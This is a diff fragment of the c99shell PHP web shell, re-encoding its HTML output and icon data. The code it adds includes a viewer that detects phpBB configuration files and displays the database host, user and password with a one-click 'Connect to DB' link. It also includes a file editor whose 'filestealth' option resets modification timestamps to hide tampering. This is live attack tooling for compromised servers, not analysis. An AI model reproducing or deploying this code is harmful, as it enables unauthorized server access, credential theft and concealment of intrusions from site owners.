+  elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
   elseif ($ft == "code")
   {
    if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
@@ -2848,21 +2848,21 @@ else
     if (count($arr == 18))
     {
      include($d.$f);
-     echo "&lt;b&gt;phpBB configuration is detected in this file!&lt;br&gt;";
+     echo "<b>phpBB configuration is detected in this file!<br>";
      if ($dbms == "mysql4") {$dbms = "mysql";}
-     if ($dbms == "mysql") {echo "&lt;a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"&gt;&lt;b&gt;&lt;u&gt;Connect to DB&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;";}
+     if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}
      else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99shell. Please, report us for fix.";}
-     echo "Parameters for manual connect:&lt;br&gt;";
-     $cfgvars = array("dbms"=&gt;$dbms,"dbhost"=&gt;$dbhost,"dbname"=&gt;$dbname,"dbuser"=&gt;$dbuser,"dbpasswd"=&gt;$dbpasswd);
-     foreach ($cfgvars as $k=&gt;$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'&lt;br&gt;";}
-     echo "&lt;/b&gt;&lt;hr size=\"1\" noshade&gt;";
+     echo "Parameters for manual connect:<br>";
+     $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);
+     foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
+     echo "</b><hr size=\"1\" noshade>";
     }
    }
-   echo "&lt;div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\"&gt;";
+   echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
    if (!empty($white)) {@ob_clean();}
    highlight_file($d.$f);
    if (!empty($white)) {c99shexit();}
-   echo "&lt;/div&gt;";
+   echo "</div>";
   }
   elseif ($ft == "download")
   {
@@ -2889,16 +2889,16 @@ else
     if (empty($imgsize)) {$imgsize = 20;}
     $width = $inf[0]/100*$imgsize;
     $height = $inf[1]/100*$imgsize;
-    echo "&lt;center&gt;&lt;b&gt;Size:&lt;/b&gt;&nbsp;";
+    echo "<center><b>Size:</b>&nbsp;";
     $sizes = array("100","50","20");
     foreach ($sizes as $v)
     {
-     echo "&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\"&gt;";
+     echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";
      if ($imgsize != $v ) {echo $v;}
-     else {echo "&lt;u&gt;".$v."&lt;/u&gt;";}
-     echo "&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
+     else {echo "<u>".$v."</u>";}
+     echo "</a>&nbsp;&nbsp;&nbsp;";
     }
-    echo "&lt;br&gt;&lt;br&gt;&lt;img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"&gt;&lt;/center&gt;";
+    echo "<br><br><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>";
    }
    else
    {
@@ -2916,10 +2916,10 @@ else
    {
     if ($filestealth) {$stat = stat($d.$f);}
     $fp = fopen($d.$f,"w");
-    if (!$fp) {echo "&lt;b&gt;Can't write to file!&lt;/b&gt;";}
+    if (!$fp) {echo "<b>Can't write to file!</b>";}
     else
     {
-     echo "&lt;b&gt;Saved!&lt;/b&gt;";
+     echo "<b>Saved!</b>";
      fwrite($fp,$edit_text);
      fclose($fp);
      if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
@@ -2927,12 +2927,12 @@ else
     }
    }
    $rows = count(explode("\r\n",$r));
-   if ($rows &lt; 10) {$rows = 10;}
-   if ($rows &gt; 30) {$rows = 30;}
-   echo "&lt;form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST&gt;&lt;input type=submit name=submit value=\"Save\"&gt;&nbsp;&lt;input type=\"reset\" value=\"Reset\"&gt;&nbsp;&lt;input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"&gt;&lt;br&gt;&lt;textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\"&gt;".htmlspecialchars($r)."&lt;/textarea&gt;&lt;/form&gt;";
+   if ($rows < 10) {$rows = 10;}
+   if ($rows > 30) {$rows = 30;}
+   echo "<form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
   }
-  elseif (!empty($ft)) {echo "&lt;center&gt;&lt;b&gt;Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.&lt;/b&gt;&lt;/center&gt;";}
-  else {echo "&lt;center&gt;&lt;b&gt;Unknown extension (".$ext."), please, select type manually.&lt;/b&gt;&lt;/center&gt;";}
+  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
+  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}
 }
 }
 }
@@ -2940,25 +2940,25 @@ else
 {
 @ob_clean();
 $images = array(
-"arrow_ltr"=&gt;
+"arrow_ltr"=>
 "R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".
 "SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
-"back"=&gt;
+"back"=>
 "R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
 "aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
 "Wg0JADs=",
-"buffer"=&gt;
+"buffer"=>
 "R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
 "eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
 "Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
-"change"=&gt;
+"change"=>
 "R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
 "/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
 "AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
 "wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
 "CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".
 "zMshADs=",
-"delete"=&gt;
+"delete"=>
 "R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".
 "6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".
 "sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".
@@ -2970,46 +2970,46 @@ $images = array(
 "STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G".
 "BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ".
 "jwVFHBgiEGQFIgQasYkcSbJQIAA7",
-"download"=&gt;
+"download"=>
 "R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA".
 "AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu".
 "EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=",
-"forward"=&gt;
+"forward"=>
 "R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
 "aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt".
 "WqsJADs=",
-"home"=&gt;
+"home"=>
 "R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA".
 "AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS".
 "krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j".
 "VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=",
-"mode"=&gt;
+"mode"=>
 "R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA".
 "AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO".
 "2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/".
 "dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=",
-"refresh"=&gt;
+"refresh"=>
 "R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA".
 "AAAAACH5BAEAAAwALAAAAAARABQAAAR1kMlJq0Q460xR+GAoIMvkheIYlMyJBkJ8lm6YxMKi6zWY".
 "3AKCYbjo/Y4EQqFgKIYUh8EvuWQ6PwPFQJpULpunrXZLrYKx20G3oDA7093Esv19q5O/woFu9ZAJ".
 "R3lufmWCVX13h3KHfWWMjGBDkpOUTTuXmJgRADs=",
-"search"=&gt;
+"search"=>
 "R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//".
 "/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap".
 "s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD".
 "AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr".
 "Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==",
-"setup"=&gt;
+"setup"=>
 "R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".
 "QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
 "ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".
 "qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".
 "OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",
-"small_dir"=&gt;
+"small_dir"=>
 "R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
 "AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
 "/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
-"small_unk"=&gt;
+"small_unk"=>
 "R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U".
 "p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo".
 "/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31".
@@ -3029,15 +3029,15 @@ $images = array(
 "uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC".
 "yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj".
 "yAsokBkQADs=",
-"multipage"=&gt;"R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR".
+"multipage"=>"R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR".
 "pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==",
-"sort_asc"=&gt;
+"sort_asc"=>
 "R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".
 "SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",
-"sort_desc"=&gt;
+"sort_desc"=>
 "R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".
 "SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",
-"sql_button_drop"=&gt;
+"sql_button_drop"=>
 "R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
 "/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
@@ -3054,7 +3054,7 @@ $images = array(
 "zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA".
 "AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/".
 "AQEAOw==",
-"sql_button_empty"=&gt;
+"sql_button_empty"=>
 "R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
 "/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
@@ -3070,7 +3070,7 @@ $images = array(
 "mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
 "zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA".
 "AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==",
-"sql_button_insert"=&gt;
+"sql_button_insert"=>
 "R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
 "/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
@@ -3086,29 +3086,29 @@ $images = array(
 "mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
 "zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA".
 "AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=",
-"up"=&gt;
+"up"=>
 "R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA".
 "AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg".
 "+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV".
 "IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==",
-"write"=&gt;
+"write"=>
 "R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".
 "AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".
 "EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".
 "LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",
-"ext_asp"=&gt;
+"ext_asp"=>
 "R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".
 "/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI".
 "D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=",
-"ext_mp3"=&gt;
+"ext_mp3"=>
 "R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
 "aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
 "IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
-"ext_avi"=&gt;
+"ext_avi"=>
 "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM".
 "WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4".
 "PYXCyg+V2i44XeRmSfYqsGhAAgA7",
-"ext_cgi"=&gt;
+"ext_cgi"=>
 "R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9".
 "DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6".
 "LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S".
@@ -3120,19 +3120,19 @@ $images = array(
 "BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD".
 "AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi".
 "RYtMAgEAOw==",
-"ext_cmd"=&gt;
+"ext_cmd"=>
 "R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".
 "eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".
 "dmrYAMn1onq/YKpjvEgAADs=",
-"ext_cpp"=&gt;
+"ext_cpp"=>
 "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC".
 "WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra".
 "Eq7YrLDE7a4SADs=",
-"ext_ini"=&gt;
+"ext_ini"=>
 "R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL".
 "aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM".
 "SnEjgPVarHEHgrB43JvszsQEADs=",
-"ext_diz"=&gt;
+"ext_diz"=>
 "R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs".
 "/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv".
 "/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3".
@@ -3152,42 +3152,42 @@ $images = array(
 "2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF".
 "CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA".
 "Ow==",
-"ext_doc"=&gt;
+"ext_doc"=>
 "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR".
 "WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq".
 "MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=",
-"ext_exe"=&gt;
+"ext_exe"=>
 "R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
 "WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
 "xhIAOw==",
-"ext_h"=&gt;
+"ext_h"=>
 "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB".
 "WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo".
 "Wq/NknbbSgAAOw==",
-"ext_hpp"=&gt;
+"ext_hpp"=>
 "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF".
 "WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR".
 "UqUagnbLdZa+YFcCADs=",
-"ext_htaccess"=&gt;
+"ext_htaccess"=>
 "R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6".
 "WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ".
 "AAA7",
-"ext_html"=&gt;
+"ext_html"=>
 "R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
 "c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
 "KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
 "Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
 "ADs=",
-"ext_jpg"=&gt;
+"ext_jpg"=>
 "R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
 "Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
 "FxEAOw==",
-"ext_js"=&gt;
+"ext_js"=>
 "R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
 "k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
 "a00AjYYBbc/o9HjNniUAADs=",
-"ext_lnk"=&gt;
+"ext_lnk"=>
 "R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO".
 "NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi".
 "Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk".
@@ -3199,23 +3199,23 @@ $images = array(
 "NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf".
 "1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ".
 "ADs=",
-"ext_log"=&gt;
+"ext_log"=>
 "R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA".
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN".
 "zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==",
-"ext_php"=&gt;
+"ext_php"=>
 "R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg".
 "t0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==",
-"ext_pl"=&gt;
+"ext_pl"=>
 "R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".
 "GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",
-"ext_swf"=&gt;
+"ext_swf"=>
 "R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".
 "nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
 "ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".
 "GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".
